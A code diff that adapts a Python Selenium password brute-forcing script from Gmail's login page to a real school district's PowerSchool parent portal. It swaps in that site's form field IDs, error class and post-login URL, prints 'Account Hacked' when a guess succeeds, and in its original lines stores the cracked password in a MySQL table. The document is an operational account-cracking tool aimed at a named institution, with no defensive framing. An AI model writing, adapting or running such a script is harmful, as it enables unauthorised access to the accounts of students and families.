@@ -31,8 +31,8 @@ CAPTCHA_IMAGE_FOLDER = "C:/Users//PycharmProjects/chromedriver_win32/generated_c
 CAPTCHA_IMAGE = "C:/Users//PycharmProjects/chromedriver_win32/screenshot.png"
 GuessedPasswords = "C:/Users//PycharmProjects/chromedriver_win32/GuessedPasswords"
 '''Connects to the MySQL database "python_db" with user 'admin' and the password '' '''
-mydb = mysql.connector.connect(host='localhost', database='python_db', user='admin', password='')
-mycursor = mydb.cursor()
+#mydb = mysql.connector.connect(host='localhost', database='python_db', user='admin', password='')
+#mycursor = mydb.cursor()
 min_char = 4  # Sets minimum characters
 max_char = 4  # Sets maximum characters
 '''Sets "allchar" to all Lowercase & Uppercase letters & digits, sets "lowerchar" to all lowercase letters & punctuation
@@ -68,7 +68,7 @@ while x == 1:
         if content[cnt] == 0:
             content.pop()
         else:
-            usernameStr = content[0] + "@gvr5.net"
+            usernameStr = content[0]
             mysql_username = content[0]
             cnt += 1
 
@@ -84,17 +84,13 @@ while x == 1:
                              "generated_captcha_images")
         browser = webdriver.Chrome('C:/Users/Ryan DeHaan/PycharmProjects/chromedriver_win32/chromedriver.exe',
                                     chrome_options=options)
-        browser.get(('https://accounts.google.com/ServiceLogin?'
-                     'service=mail&continue=https://mail.google'
-                     '.com/mail/#identifier'))
+        browser.get(('https://ps.grainvalley.k12.mo.us/public/home.html'))
         '''Sets "username" to find the input box by finding the id('identifierID') of the input box for
          your email. It then types in the input box the variable "usernameStr" that we set to the desired
          Email. Then it finds the next button by its id('identifierNext') and then sets it to the "nextButton" 
          identifier after it finds the element it clicks the button.'''
-        username = browser.find_element_by_id('identifierId')
+        username = browser.find_element_by_id('fieldAcount')
         username.send_keys(usernameStr)
-        nextButton = browser.find_element_by_id('identifierNext')
-        nextButton.click()
 
         '''Has the variable "password" wait until the presence of the element "password" is located, it waits 10
         seconds and if it can't find the element it will return a "NoSuchElementException". If it finds the element
@@ -102,7 +98,7 @@ while x == 1:
         Characters. It then prints the password that was inputted after that it tries to find the element "passwordNext"
         . Once the element if found it will execute a script to click the button to login.'''
         password = WebDriverWait(browser, 100).until(
-            EC.presence_of_element_located((By.NAME, "password")))
+            EC.presence_of_element_located((By.NAME, "pw")))
         browser.implicitly_wait(5)
         for line in open(GuessedPasswords, "r+").readlines():
             info = line.split()
@@ -116,7 +112,7 @@ while x == 1:
         fo.write(passwordStr + " ")
         fo.close()
 
-        signInButton = browser.find_element_by_id('passwordNext')
+        signInButton = browser.find_element_by_id('btn-enter')
         browser.execute_script("arguments[0].click();", signInButton)
 
 
@@ -157,23 +153,23 @@ while x == 1:
         try:
             # Waits 5 seconds until "Wrong Password Error" otherwise it will return a "Timeout Exception"
             wait = WebDriverWait(browser, 5).until(
-                EC.visibility_of_element_located((By.CLASS_NAME, "EjBTad")))  # Class name changes Sometimes
+                EC.visibility_of_element_located((By.CLASS_NAME, "feedback-alert")))  # Class name changes Sometimes
             # Finds the "Wrong Password Error" text and sets it to the variable elem
-            elem = browser.find_element_by_class_name("EjBTad").text
+            elem = browser.find_element_by_class_name("feedback-alert").text
             passwordFound = False
             browser.quit()
         # If "Timeout Exception" returned by "try:" statement this code will run
         except TimeoutException:
             # Checks to see that page has fully loaded and if it is prints "Account Hacked"
-            if browser.current_url == "https://mail.google.com/mail/u/0/#inbox":
+            if browser.current_url == "https://ps.grainvalley.k12.mo.us/guardian/home.html":
                 print("Account Hacked")
                 open(GuessedPasswords, 'w').close()
                 passwordFound = True
                 '''Stores the correct user password under the users username in the MySQL database "python_db" '''
-                mycursor.execute("UPDATE accounts SET password =%s WHERE name =%s", (passwordStr, mysql_username))
-                mycursor.close()
-                mydb.commit()
-                mydb.close()
+                #mycursor.execute("UPDATE accounts SET password =%s WHERE name =%s", (passwordStr, mysql_username))
+                #mycursor.close()
+                #mydb.commit()
+                #mydb.close()
                 # Ask user if they would like to Reset Email list
                 userinput = input("Reset Email List?:")
                 '''If the user inputs "yes" or "Yes" it will load the backup file then it read every line in the file
